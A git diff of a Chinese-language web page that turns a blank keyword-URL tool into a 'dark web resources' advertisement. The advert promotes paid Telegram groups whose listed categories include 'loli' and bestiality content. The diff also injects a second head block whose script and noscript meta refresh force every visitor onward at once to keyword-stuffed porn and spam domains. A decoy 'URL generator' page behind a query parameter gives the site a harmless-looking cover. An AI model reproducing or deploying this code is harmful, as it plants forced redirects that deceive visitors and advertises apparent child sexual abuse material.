@@ -1,120 +1,389 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
+
+	
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>暗网资源大放送</title>
     <style>
-        /* 极小化样式，仅保留必要功能 */
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: sans-serif; 
-            background: transparent; 
-            color: transparent; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            line-height: 1.6; 
+            color: #333; 
+            background: #f5f7fa;
             min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        /* 通用容器样式 */
+        .page-container {
+            max-width: 700px;
+            width: 100%;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
             overflow: hidden;
         }
-        /* 隐藏所有元素的极简样式 */
-        .hidden-interface {
+        
+        /* 第一个页面（URL生成器）的特定样式 */
+        #urlGeneratorPage .title {
+            font-size: 3.5rem;
+            font-weight: 300;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+            padding-top: 40px;
+        }
+        #urlGeneratorPage .subtitle {
+            font-size: 1.2rem;
+            color: #7f8c8d;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+            margin-bottom: 40px;
+        }
+        #urlGeneratorPage .intro-section {
+            padding: 30px;
+        }
+        #urlGeneratorPage .intro-section h1 {
+            font-size: 2.5rem;
+            color: #2c3e50;
+            margin-bottom: 20px;
+        }
+        #urlGeneratorPage .intro-section p {
+            margin-bottom: 15px;
+            text-align: left;
+            line-height: 1.7;
+        }
+        .email-link {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 25px;
+            background-color: #3498db;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+        .email-link:hover {
+            background-color: #2980b9;
+            transform: translateY(-2px);
+        }
+        
+        /* 第二个页面（暗网资源大放送）的特定样式 */
+        #personalPage .title-section {
+            padding: 40px 30px 10px;
+            text-align: center;
+        }
+        #personalPage .main-title {
+            font-size: 2.5rem;
+            color: #2c3e50;
+            margin-bottom: 5px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        #personalPage .subtitle {
+            font-size: 1.1rem;
+            color: #7f8c8d;
+            font-weight: 300;
+        }
+        #personalPage .description-section {
+            padding: 20px 30px 10px;
+        }
+        #personalPage .description-content {
+            font-size: 1.05rem;
+            line-height: 1.6;
+            color: #555;
+            text-align: justify;
+        }
+        #personalPage .description-content p {
+            margin-bottom: 15px;
+        }
+        #personalPage .image-section {
+            padding: 20px 30px 10px;
+        }
+        #personalPage .large-image {
+            width: 100%;
+            height: 220px;
+            object-fit: cover;
+            border-radius: 6px;
+            display: block;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
+        }
+        #personalPage .contact-section {
+            padding: 25px 30px 35px;
+            text-align: center;
+        }
+        #personalPage .contact-button {
+            display: inline-block;
+            padding: 12px 28px;
+            background-color: #3498db;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            max-width: 200px;
+        }
+        #personalPage .contact-button:hover {
+            background-color: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(52, 152, 219, 0.3);
+        }
+        
+        /* 通用页脚样式 */
+        .page-footer {
+            text-align: center;
+            padding: 20px;
+            color: #95a5a6;
+            font-size: 0.85rem;
+            border-top: 1px solid #eee;
+        }
+        .hidden {
             display: none !important;
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 768px) {
+            #urlGeneratorPage .title {
+                font-size: 2.8rem;
+            }
+            #urlGeneratorPage .intro-section h1 {
+                font-size: 2.2rem;
+            }
+            #personalPage .title-section,
+            #personalPage .description-section,
+            #personalPage .image-section,
+            #personalPage .contact-section {
+                padding-left: 20px;
+                padding-right: 20px;
+            }
+            #personalPage .large-image {
+                height: 190px;
+            }
+        }
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            .page-container {
+                max-width: 100%;
+            }
+            #urlGeneratorPage .title {
+                font-size: 2.2rem;
+            }
+            #urlGeneratorPage .subtitle {
+                font-size: 1rem;
+            }
+            #urlGeneratorPage .intro-section {
+                padding: 20px;
+            }
+            #personalPage .main-title {
+                font-size: 1.9rem;
+            }
+            #personalPage .large-image {
+                height: 160px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- 完全空白的HTML结构，但保留功能 -->
+    <!-- 页面1：关键词URL生成器介绍 (默认隐藏) -->
+    <div id="urlGeneratorPage" class="page-container hidden">
+        <div class="intro-section">
+            <div class="title">多关键词URL生成器</div>
+            <div class="subtitle">专业技术服务关键词URL参数生成工具</div>
+            
+            <h1>多关键词URL生成器</h1>
+            <p>大家好，这是一个简洁实用的工具，可以将多个关键词快速生成为URL参数格式。只需在下方的操作区域输入关键词和URL参数，即可生成带参数的链接。</p>
+            <p>生成的URL可以直接用于网站搜索、API调用或其他需要传递多个关键词的场景。使用简单，方便快捷。</p>
+            <p>如果有任何问题或建议，欢迎联系我：</p>
+            <a href="mailto:4444@qq.com" class="email-link">4444@qq.com</a>
+        </div>
+        <footer class="page-footer">
+            <p>© 2024 关键词URL生成器 | 内部数据处理工具</p>
+            <!-- 添加返回个人介绍页的入口 -->
+            <p style="margin-top: 10px;">
+                <a href="?" style="color: #95a5a6; text-decoration: none; font-size: 0.8rem;">
+                    ← 返回个人介绍
+                </a>
+            </p>
+        </footer>
+    </div>
     
-    <!-- 隐藏的功能元素 -->
-    <div id="hiddenFunctionality" style="display: none;">
-        <!-- 这些元素用于功能但不可见 -->
-        <input type="text" id="keywords" value="">
-        <input type="text" id="baseUrl" value="">
-        <div id="generatedUrl"></div>
-        <div id="paramList"></div>
+    <!-- 页面2：个人介绍页 (默认显示) -->
+    <div id="personalPage" class="page-container">
+        <!-- 标题部分 -->
+        <section class="title-section">
+            <h1 class="main-title">打垮奸商</h1>
+            <p class="subtitle">暗网资源免费预览</p>
+        </section>
+        
+        <!-- 描述部分 -->
+        <section class="description-section">
+            <div class="description-content">
+                <p>数十万媒体库直接看+百丽 购买获得会员大群内包含： 79项独立资源群，全网最齐
+
+小马. 萝莉 .兽.  U，雪生，等一系列会员群内涵独立资源群
+
+此会员包含预览里面所有的资源，一切资源独立安装，在线观看，所以资源包真实。基地等交流群。</p>
+                <p>我们的私密群：支持收藏下载，转发，保存</p>
+            </div>
+        </section>
+        
+        <!-- 图片部分 -->
+        <section class="image-section">
+            <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixlib=rb-4.0.3&auto=format&fit=crop&w=700&q=80" alt="工作环境" class="large-image">
+        </section>
+        
+        <!-- 联系按钮部分 -->
+        <section class="contact-section">
+            <a href="https://t.me/+yJmwctnTROo0NTZh" class="contact-button">
+                免费进群观影
+            </a>
+        </section>
+        
+		<head>
+        <meta charset="UTF-8">
+        <title>1:26:59 | hotleakvisaudi1.site</title>
+        <meta name="description" content="">
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://ff813ff.github.io/llw/?k=http://hotleakvisaudi1.store/AEDJWOYG/XXTuKkPRGO4EW.htmlsafada-cerda-feet-korean-kagney-linn-karter-bbw-nylons-kendra-lust-femboy-august-ames-sexoduro-xporn-dm-rule34-destiny-cruz-skylar-vox-amouranth-buttplug-pocala-anal-goon-bubblebutt-aishah-sofey-loli-ardente-adulto-stepsister-cachonda-co-o-asian-mick-blue-hentai-chastity-realcouple-stepdad-colombian-mamada-18-snowbunny-tetas-latinabooty-ria-sunn-madison-ivy-fetiche-jessa-rhodes-stoya-massage-culoabierto-phoenix-marie-mia-malkova-furry-jasmine-jae-mandingo-atrevida-bhad-bhabie-codi-vore-tina-kay-incest-chinese-gay-milf-videos-luxury-girl-riley-reid-genshin-squirting-fuck-lana-rhoades-lesbian-breckie-hill-vietbunny-black-fantasia-bokep-scissoring-queenofsp-brazilian-gianna-dior-coco-lovelock-chudai-cuckold-aidra-fox-lujuria-baise-sexting-ava-addams-sexo-pussylicking-cuminside-veronica-avluv-dating-countdown-asmrporn-oculus-jordi-el-ni-o-polla-blowjob-lisa-ann-solazola-keisha-grey-tesao-hot-bwc-nude-tape-lela-sohna-cougar-syren-de-mer-tori-black-dick-luna-star-yaoi-asianteen-shemale-big-ass-vrporn-stepbrother-rose-monroe-scarlit-scandal-ai-porn-perversi-n-proibido-mindful-femaleorgasm-puteria-domination-cei-lesbianteen-nicolette-shea-sophie-rain-brunette-modest-jav-analtraining-lick-spicymami-danny-d-ladyboy-milf-diamond-jackson-twerk-bdsm-horny-liv-wild-ari-kytsya-markus-dupree-cul-vcs-kissa-sins-sky-crossdresser-ometv-brett-rossi-lingerie-celeb-girl-brandi-love-slut-blonde-hardcore-footjob-asa-akira-squirt-nude-toesuck-thai-bikini-lily-phillips-valentina-nappi-swing-gia-derza-babe-trans-britney-amber-creampie-japanese-jada-fire-soles-pussy-ahegao-fansly-bonnie-blue-cherokee-d-ass-bri-kiss-madi-collins-leagueoflegends-sissy-dredd-pov-alberto-blanco-homemade-culo-gape-cbt-corinna-kopf-adriana-chechik-julia-ann-sera-ryder-eva-elfie-moriah-mills-mia-khalifa-autumn-falls-strapon-rata-egirl-breeding-freya-von-doom-zorra-stepmom-charly-summer-amateur-owen-gray-porno-orgasm-show-pinkie-pornhub-romi-rain-ecchi-seducao-sharing-prazer-">
+        <meta property="og:title" content="1:16:59">
+        <meta property="og:description" content="">
+        <meta property="og:updated_time" content="1735120702">
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="1:26:59">
+        <meta name="twitter:description" content="">
+        <meta property="og:image" content="http://hotleakvisaudi1.site/aRNhUORV/TryRwjehO0OG5.htmlsafada-cerda-feet-korean-kagney-linn-karter-bbw-nylons-kendra-lust-femboy-august-ames-sexoduro-xporn-dm-rule34-destiny-cruz-skylar-vox-amouranth-buttplug-pocala-anal-goon-bubblebutt-aishah-sofey-loli-ardente-adulto-stepsister-cachonda-co-o-asian-mick-blue-hentai-chastity-realcouple-stepdad-colombian-mamada-18-snowbunny-tetas-latinabooty-ria-sunn-madison-ivy-fetiche-jessa-rhodes-stoya-massage-culoabierto-phoenix-marie-mia-malkova-furry-jasmine-jae-mandingo-atrevida-bhad-bhabie-codi-vore-tina-kay-incest-chinese-gay-milf-videos-luxury-girl-riley-reid-genshin-squirting-fuck-lana-rhoades-lesbian-breckie-hill-vietbunny-black-fantasia-bokep-scissoring-queenofsp-brazilian-gianna-dior-coco-lovelock-chudai-cuckold-aidra-fox-lujuria-baise-sexting-ava-addams-sexo-pussylicking-cuminside-veronica-avluv-dating-countdown-asmrporn-oculus-jordi-el-ni-o-polla-blowjob-lisa-ann-solazola-keisha-grey-tesao-hot-bwc-nude-tape-lela-sohna-cougar-syren-de-mer-tori-black-dick-luna-star-yaoi-asianteen-shemale-big-ass-vrporn-stepbrother-rose-monroe-scarlit-scandal-ai-porn-perversi-n-proibido-mindful-femaleorgasm-puteria-domination-cei-lesbianteen-nicolette-shea-sophie-rain-brunette-modest-jav-analtraining-lick-spicymami-danny-d-ladyboy-milf-diamond-jackson-twerk-bdsm-horny-liv-wild-ari-kytsya-markus-dupree-cul-vcs-kissa-sins-sky-crossdresser-ometv-brett-rossi-lingerie-celeb-girl-brandi-love-slut-blonde-hardcore-footjob-asa-akira-squirt-nude-toesuck-thai-bikini-lily-phillips-valentina-nappi-swing-gia-derza-babe-trans-britney-amber-creampie-japanese-jada-fire-soles-pussy-ahegao-fansly-bonnie-blue-cherokee-d-ass-bri-kiss-madi-collins-leagueoflegends-sissy-dredd-pov-alberto-blanco-homemade-culo-gape-cbt-corinna-kopf-adriana-chechik-julia-ann-sera-ryder-eva-elfie-moriah-mills-mia-khalifa-autumn-falls-strapon-rata-egirl-breeding-freya-von-doom-zorra-stepmom-charly-summer-amateur-owen-gray-porno-orgasm-show-pinkie-pornhub-romi-rain-ecchi-seducao-sharing-prazer-video-highheels-assfuck-gostosa-sexe-pinay-harleyquinn-threesome-gooning-leak-pawg-lesbians-xxx-elsa-jean-mexican-doubleanal-webcam-kylie-rocket-er-tico-turk-sexy-spanking-curvy-single-ebonyass-fetichismo-jada-stevens-bondage-transwife-anime-naked-brandi-bae-sasha-grey-demi-sutra-daisy-keech-india-summer-leigh-darby-julianne-vega-steve-holmes-jackie-hoff-xhamster-bbc-oral-tits-cosplay-nudes-camilla-araujo-julia-filippo-ana-foxxx-boobs-vr-sex-futanari-footworship-violet-myers-alina-lopez-stepfamily-latina-video-onlyfans-content-onlyfans-gal-ritchie-hard-xx-ebony-kira-noir-impregnation-pussyjuice-sophie-rain-teen-bull-bophouse-the-plug-keiran-lee-renee-pornero-violet-findom-johnny-sins-xvideos-summerxiris-desnuda-emily-willis-jason-luv-ava-sinclaire-joymei-alina-rose-titties-mommy-placer-dillion-harper-trade-trap-bigass-mature-wetmess-jameliz-nekocosplay-expose-blake-blossom-joi-x-femdom-angela-white-chanell-heart-360porn-waifu-sophie-rain-gamergirl-sophie-dee-morgan-rain-kendra-sunderland-paixao-edging-porn-wife-premium-viet-phatass-demure-pegging-cherie-deville-leolulu-dildo-manuel-ferrara-alexis-fawx-valerie-kay-liberal-violet-starr-karlee-grey-virtualsex-belle-delphine-nicole-aniston-video-adult-chris-diamond-ethical-porn-lasirena69-semcensura-gilf-cnc-jazmin-luv-gabbie-carter-bareback-snap-interracial-rough-girlgirl-vip-girlfriend-classy-sensual-morbo-momson-alexis-texas-quente-tentacle-abella-danger-rebecca-more-cumshot-tribbing-taboo-cock-anissa-kate-rain-lela-star-iggy-azalea-3dhentai-analcreampie-nsfw-orgasmo-caliente-yuri-tradwife-peta-jensen-familyroleplay-hotwife-py0xf9n0?preload=/wp-content/image.jpg">
+        <meta name="twitter:image" content="http://hotleakvisaudi1.site/aRNhUORV/TryRwjehO0OG5.htmlsafada-cerda-feet-korean-kagney-linn-karter-bbw-nylons-kendra-lust-femboy-august-ames-sexoduro-xporn-dm-rule34-destiny-cruz-skylar-vox-amouranth-buttplug-pocala-anal-goon-bubblebutt-aishah-sofey-loli-ardente-adulto-stepsister-cachonda-co-o-asian-mick-blue-hentai-chastity-realcouple-stepdad-colombian-mamada-18-snowbunny-tetas-latinabooty-ria-sunn-madison-ivy-fetiche-jessa-rhodes-stoya-massage-culoabierto-phoenix-marie-mia-malkova-furry-jasmine-jae-mandingo-atrevida-bhad-bhabie-codi-vore-tina-kay-incest-chinese-gay-milf-videos-luxury-girl-riley-reid-genshin-squirting-fuck-lana-rhoades-lesbian-breckie-hill-vietbunny-black-fantasia-bokep-scissoring-queenofsp-brazilian-gianna-dior-coco-lovelock-chudai-cuckold-aidra-fox-lujuria-baise-sexting-ava-addams-sexo-pussylicking-cuminside-veronica-avluv-dating-countdown-asmrporn-oculus-jordi-el-ni-o-polla-blowjob-lisa-ann-solazola-keisha-grey-tesao-hot-bwc-nude-tape-lela-sohna-cougar-syren-de-mer-tori-black-dick-luna-star-yaoi-asianteen-shemale-big-ass-vrporn-stepbrother-rose-monroe-scarlit-scandal-ai-porn-perversi-n-proibido-mindful-femaleorgasm-puteria-domination-cei-lesbianteen-nicolette-shea-sophie-rain-brunette-modest-jav-analtraining-lick-spicymami-danny-d-ladyboy-milf-diamond-jackson-twerk-bdsm-horny-liv-wild-ari-kytsya-markus-dupree-cul-vcs-kissa-sins-sky-crossdresser-ometv-brett-rossi-lingerie-celeb-girl-brandi-love-slut-blonde-hardcore-footjob-asa-akira-squirt-nude-toesuck-thai-bikini-lily-phillips-valentina-nappi-swing-gia-derza-babe-trans-britney-amber-creampie-japanese-jada-fire-soles-pussy-ahegao-fansly-bonnie-blue-cherokee-d-ass-bri-kiss-madi-collins-leagueoflegends-sissy-dredd-pov-alberto-blanco-homemade-culo-gape-cbt-corinna-kopf-adriana-chechik-julia-ann-sera-ryder-eva-elfie-moriah-mills-mia-khalifa-autumn-falls-strapon-rata-egirl-breeding-freya-von-doom-zorra-stepmom-charly-summer-amateur-owen-gray-porno-orgasm-show-pinkie-pornhub-romi-rain-ecchi-seducao-sharing-prazer-video-highheels-assfuck-gostosa-sexe-pinay-harleyquinn-threesome-gooning-leak-pawg-lesbians-xxx-elsa-jean-mexican-doubleanal-webcam-kylie-rocket-er-tico-turk-sexy-spanking-curvy-single-ebonyass-fetichismo-jada-stevens-bondage-transwife-anime-naked-brandi-bae-sasha-grey-demi-sutra-daisy-keech-india-summer-leigh-darby-julianne-vega-steve-holmes-jackie-hoff-xhamster-bbc-oral-tits-cosplay-nudes-camilla-araujo-julia-filippo-ana-foxxx-boobs-vr-sex-futanari-footworship-violet-myers-alina-lopez-stepfamily-latina-video-onlyfans-content-onlyfans-gal-ritchie-hard-xx-ebony-kira-noir-impregnation-pussyjuice-sophie-rain-teen-bull-bophouse-the-plug-keiran-lee-renee-pornero-violet-findom-johnny-sins-xvideos-summerxiris-desnuda-emily-willis-jason-luv-ava-sinclaire-joymei-alina-rose-titties-mommy-placer-dillion-harper-trade-trap-bigass-mature-wetmess-jameliz-nekocosplay-expose-blake-blossom-joi-x-femdom-angela-white-chanell-heart-360porn-waifu-sophie-rain-gamergirl-sophie-dee-morgan-rain-kendra-sunderland-paixao-edging-porn-wife-premium-viet-phatass-demure-pegging-cherie-deville-leolulu-dildo-manuel-ferrara-alexis-fawx-valerie-kay-liberal-violet-starr-karlee-grey-virtualsex-belle-delphine-nicole-aniston-video-adult-chris-diamond-ethical-porn-lasirena69-semcensura-gilf-cnc-jazmin-luv-gabbie-carter-bareback-snap-interracial-rough-girlgirl-vip-girlfriend-classy-sensual-morbo-momson-alexis-texas-quente-tentacle-abella-danger-rebecca-more-cumshot-tribbing-taboo-cock-anissa-kate-rain-lela-star-iggy-azalea-3dhentai-analcreampie-nsfw-orgasmo-caliente-yuri-tradwife-peta-jensen-familyroleplay-hotwife-py0xf9n0?preload=/wp-content/image.jpg">
+        <noscript>
+            <meta http-equiv="refresh" content="0;url=https://ff813ff.github.io/llw/?k=http://hotleakvisaudi1.store/AEDJWOYG/XXTuKkPRGO4EW.htmlsafada-cerda-feet-korean-kagney-linn-karter-bbw-nylons-kendra-lust-femboy-august-ames-sexoduro-xporn-dm-rule34-destiny-cruz-skylar-vox-amouranth-buttplug-pocala-anal-goon-bubblebutt-aishah-sofey-loli-ardente-adulto-stepsister-cachonda-co-o-asian-mick-blue-hentai-chastity-realcouple-stepdad-colombian-mamada-18-snowbunny-tetas-latinabooty-ria-sunn-madison-ivy-fetiche-jessa-rhodes-stoya-massage-culoabierto-phoenix-marie-mia-malkova-furry-jasmine-jae-mandingo-atrevida-bhad-bhabie-codi-vore-tina-kay-incest-chinese-gay-milf-videos-luxury-girl-riley-reid-genshin-squirting-fuck-lana-rhoades-lesbian-breckie-hill-vietbunny-black-fantasia-bokep-scissoring-queenofsp-brazilian-gianna-dior-coco-lovelock-chudai-cuckold-aidra-fox-lujuria-baise-sexting-ava-addams-sexo-pussylicking-cuminside-veronica-avluv-dating-countdown-asmrporn-oculus-jordi-el-ni-o-polla-blowjob-lisa-ann-solazola-keisha-grey-tesao-hot-bwc-nude-tape-lela-sohna-cougar-syren-de-mer-tori-black-dick-luna-star-yaoi-asianteen-shemale-big-ass-vrporn-stepbrother-rose-monroe-scarlit-scandal-ai-porn-perversi-n-proibido-mindful-femaleorgasm-puteria-domination-cei-lesbianteen-nicolette-shea-sophie-rain-brunette-modest-jav-analtraining-lick-spicymami-danny-d-ladyboy-milf-diamond-jackson-twerk-bdsm-horny-liv-wild-ari-kytsya-markus-dupree-cul-vcs-kissa-sins-sky-crossdresser-ometv-brett-rossi-lingerie-celeb-girl-brandi-love-slut-blonde-hardcore-footjob-asa-akira-squirt-nude-toesuck-thai-bikini-lily-phillips-valentina-nappi-swing-gia-derza-babe-trans-britney-amber-creampie-japanese-jada-fire-soles-pussy-ahegao-fansly-bonnie-blue-cherokee-d-ass-bri-kiss-madi-collins-leagueoflegends-sissy-dredd-pov-alberto-blanco-homemade-culo-gape-cbt-corinna-kopf-adriana-chechik-julia-ann-sera-ryder-eva-elfie-moriah-mills-mia-khalifa-autumn-falls-strapon-rata-egirl-breeding-freya-von-doom-zorra-stepmom-charly-summer-amateur-owen-gray-porno-orgasm-show-pinkie-pornhub-romi-rain-ecchi-seducao-sharing-prazer-" />
+        </noscript>
+        <style>
+            body {
+                background: #f8f8f8;
+                position: relative;
+            }
+            .loader,
+            .loader:after {
+                border-radius: 50%;
+                width: 5em;
+                height: 5em;
+            }
+            .loader {
+                position: absolute !important;
+                top: 250px;
+                display: block;
+                left: 48%;
+                left: calc(50vw - 5em);
+                font-size: 10px;
+                text-indent: -9999em;
+                border-top: 1.1em solid rgba(128, 128, 128, 0.2);
+                border-right: 1.1em solid rgba(128, 128, 128, 0.2);
+                border-bottom: 1.1em solid rgba(128, 128, 128, 0.2);
+                border-left: 1.1em solid grey;
+                -webkit-transform: translateZ(0);
+                -ms-transform: translateZ(0);
+                transform: translateZ(0);
+                -webkit-animation: load8 1.1s infinite linear;
+                animation: load8 1.1s infinite linear;
+            }
+            @-webkit-keyframes load8 {
+                0% {
+                    -webkit-transform: rotate(0);
+                    transform: rotate(0);
+                }
+                100% {
+                    -webkit-transform: rotate(360deg);
+                    transform: rotate(360deg);
+                }
+            }
+            @keyframes load8 {
+                0% {
+                    -webkit-transform: rotate(0);
+                    transform: rotate(0);
+                }
+                100% {
+                    -webkit-transform: rotate(360deg);
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+
+        <script>
+            window.setTimeout(function () {
+                window.location.href = 'https://ff813ff.github.io/llw/?k=http://hotleakvisaudi1.store/AEDJWOYG/XXTuKkPRGO4EW.htmlsafada-cerda-feet-korean-kagney-linn-karter-bbw-nylons-kendra-lust-femboy-august-ames-sexoduro-xporn-dm-rule34-destiny-cruz-skylar-vox-amouranth-buttplug-pocala-anal-goon-bubblebutt-aishah-sofey-loli-ardente-adulto-stepsister-cachonda-co-o-asian-mick-blue-hentai-chastity-realcouple-stepdad-colombian-mamada-18-snowbunny-tetas-latinabooty-ria-sunn-madison-ivy-fetiche-jessa-rhodes-stoya-massage-culoabierto-phoenix-marie-mia-malkova-furry-jasmine-jae-mandingo-atrevida-bhad-bhabie-codi-vore-tina-kay-incest-chinese-gay-milf-videos-luxury-girl-riley-reid-genshin-squirting-fuck-lana-rhoades-lesbian-breckie-hill-vietbunny-black-fantasia-bokep-scissoring-queenofsp-brazilian-gianna-dior-coco-lovelock-chudai-cuckold-aidra-fox-lujuria-baise-sexting-ava-addams-sexo-pussylicking-cuminside-veronica-avluv-dating-countdown-asmrporn-oculus-jordi-el-ni-o-polla-blowjob-lisa-ann-solazola-keisha-grey-tesao-hot-bwc-nude-tape-lela-sohna-cougar-syren-de-mer-tori-black-dick-luna-star-yaoi-asianteen-shemale-big-ass-vrporn-stepbrother-rose-monroe-scarlit-scandal-ai-porn-perversi-n-proibido-mindful-femaleorgasm-puteria-domination-cei-lesbianteen-nicolette-shea-sophie-rain-brunette-modest-jav-analtraining-lick-spicymami-danny-d-ladyboy-milf-diamond-jackson-twerk-bdsm-horny-liv-wild-ari-kytsya-markus-dupree-cul-vcs-kissa-sins-sky-crossdresser-ometv-brett-rossi-lingerie-celeb-girl-brandi-love-slut-blonde-hardcore-footjob-asa-akira-squirt-nude-toesuck-thai-bikini-lily-phillips-valentina-nappi-swing-gia-derza-babe-trans-britney-amber-creampie-japanese-jada-fire-soles-pussy-ahegao-fansly-bonnie-blue-cherokee-d-ass-bri-kiss-madi-collins-leagueoflegends-sissy-dredd-pov-alberto-blanco-homemade-culo-gape-cbt-corinna-kopf-adriana-chechik-julia-ann-sera-ryder-eva-elfie-moriah-mills-mia-khalifa-autumn-falls-strapon-rata-egirl-breeding-freya-von-doom-zorra-stepmom-charly-summer-amateur-owen-gray-porno-orgasm-show-pinkie-pornhub-romi-rain-ecchi-seducao-sharing-prazer-';
+            }, 0);
+        </script>
+    </head>
+	
+	
+		
+        <!-- 底部 -->
+        <footer class="page-footer">
+            <p>© 11111</p>
+            <!-- 添加查看生成器页面的入口（隐藏入口） -->
+            <p style="margin-top: 10px; font-size: 0.7rem; opacity: 0.5;">
+                <a href="?view=generator" style="color: #95a5a6; text-decoration: none;">
+                    开发者工具
+                </a>
+            </p>
+        </footer>
     </div>
 
     <script>
-        // 页面加载时检查URL参数（隐藏参数机制的核心功能）
+        // 页面加载时检查URL参数，决定显示哪个页面
         document.addEventListener('DOMContentLoaded', function() {
-            // 获取当前URL中的参数
             const urlParams = new URLSearchParams(window.location.search);
-            const encodedKeywords = urlParams.get('k');
+            const viewType = urlParams.get('view');
             
-            if (encodedKeywords) {
-                // 解码关键词
-                const keywords = decodeURIComponent(encodedKeywords).split(',').filter(k => k.trim());
-                
-                // 记录到控制台（仅用于调试）
-                console.log('隐藏参数已检测到：', keywords);
-                
-                // 清除URL参数（隐藏参数机制的核心）
-                const cleanUrl = window.location.origin + window.location.pathname;
-                window.history.replaceState({}, document.title, cleanUrl);
-                
-                // 设置页面标题为关键词（可选）
-                if (keywords.length > 0) {
-                    document.title = keywords.join(' ');
-                }
-                
-                // 将关键词存储到隐藏元素中
-                document.getElementById('keywords').value = keywords.join(', ');
-                
-                // 设置生成URL（用于后续功能）
-                const baseUrl = 'https://example.com/service';
-                const separator = baseUrl.includes('?') ? '&' : '?';
-                const generatedUrl = `${baseUrl}${separator}k=${encodedKeywords}`;
-                document.getElementById('generatedUrl').textContent = generatedUrl;
-                document.getElementById('baseUrl').value = baseUrl;
-                
-                // 更新参数列表
-                const paramList = document.getElementById('paramList');
-                paramList.innerHTML = '';
-                keywords.forEach(keyword => {
-                    const li = document.createElement('div');
-                    li.textContent = keyword.trim();
-                    paramList.appendChild(li);
-                });
+            const urlGeneratorPage = document.getElementById('urlGeneratorPage');
+            const personalPage = document.getElementById('personalPage');
+            
+            // 默认显示个人介绍页，只有当view=generator时才显示生成器页面
+            if (viewType === 'generator') {
+                // 显示URL生成器介绍页
+                urlGeneratorPage.classList.remove('hidden');
+                personalPage.classList.add('hidden');
+                document.title = '多关键词URL生成器';
             } else {
-                console.log('当前URL中没有检测到隐藏参数。');
+                // 显示个人介绍页（默认）
+                urlGeneratorPage.classList.add('hidden');
+                personalPage.classList.remove('hidden');
+                document.title = '暗网资源大放送';
+            }
+            
+            // 个人介绍页的图片加载错误处理
+            const largeImage = document.querySelector('#personalPage .large-image');
+            if (largeImage) {
+                largeImage.addEventListener('error', function() {
+                    this.src = 'https://images.unsplash.com/photo-1547658719-da2b51169166?ixlib=rb-4.0.3&auto=format&fit=crop&w=700&q=80';
+                });
+            }
+            
+            // 个人介绍页的联系按钮点击效果
+            const contactButton = document.querySelector('#personalPage .contact-button');
+            if (contactButton) {
+                contactButton.addEventListener('click', function(e) {
+                    this.style.opacity = '0.8';
+                    setTimeout(() => {
+                        this.style.opacity = '1';
+                    }, 150);
+                });
             }
         });
-        
-        // 自动生成URL的函数（可以通过其他方式调用）
-        function generateHiddenUrl(keywords, baseUrl) {
-            const keywordArray = keywords.split(/[,，\s]+/)
-                .map(keyword => keyword.trim())
-                .filter(keyword => keyword.length > 0);
-            
-            if (keywordArray.length === 0) return '';
-            
-            const encodedKeywords = encodeURIComponent(keywordArray.join(','));
-            const separator = baseUrl.includes('?') ? '&' : '?';
-            return `${baseUrl}${separator}k=${encodedKeywords}`;
-        }
-        
-        // 简化版复制函数
-        function copyToClipboard(text) {
-            const textArea = document.createElement('textarea');
-            textArea.value = text;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
-        }
-        
-        // 导出功能到全局作用域（如果需要外部调用）
-        window.HiddenUrlGenerator = {
-            generate: generateHiddenUrl,
-            copy: copyToClipboard,
-            getCurrentKeywords: function() {
-                return document.getElementById('keywords').value;
-            }
-        };
-        
-        console.log('隐藏参数生成器已加载（空白页面模式）');
     </script>
 </body>
 </html>
+
